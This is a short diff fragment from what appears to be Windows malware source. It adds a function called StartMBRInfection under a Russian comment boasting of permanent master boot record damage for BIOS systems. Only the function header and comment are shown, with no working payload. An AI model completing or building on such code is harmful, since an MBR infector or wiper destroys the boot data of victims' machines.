@@ -14,6 +14,8 @@
 #pragma comment(lib, "advapi32.lib")
 
 extern volatile bool g_running;
+
+void StartMBRInfection(void) {
 // ================================================================
 // 1. MBR - GG НАВСЕГДА (ДЛЯ BIOS)
 // ================================================================
